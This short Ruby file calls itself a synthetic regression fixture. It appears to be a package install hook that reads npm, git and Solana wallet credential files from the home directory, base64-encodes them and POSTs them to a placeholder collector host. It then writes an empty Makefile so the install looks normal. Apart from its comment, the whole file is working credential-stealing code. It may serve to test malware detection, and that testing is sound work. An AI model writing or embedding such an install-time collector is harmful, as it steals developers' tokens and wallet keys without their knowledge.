require 'net/http'
require 'uri'

# Synthetic regression fixture: install-time collector that reads npm, git,
# and Solana credential stores and POSTs them to a callback host.
home = Dir.home
paths = [
  File.join(home, '.npmrc'),
  File.join(home, '.git-credentials'),
  File.join(home, '.config', 'solana', 'id.json')
]
data = {}
paths.each do |p|
  next unless File.file?(p)
  data[p] = Base64.strict_encode64(File.binread(p))
end
uri = URI('https://collector.example.invalid/upload')
http = Net::HTTP.new(uri.host, uri.port)
http.use_ssl = true
req = Net::HTTP::Post.new(uri.request_uri, 'Content-Type' => 'text/plain')
req.body = data.to_s
http.request(req)

File.write('Makefile', "all:\n\t@true\ninstall:\n\t@true\n")
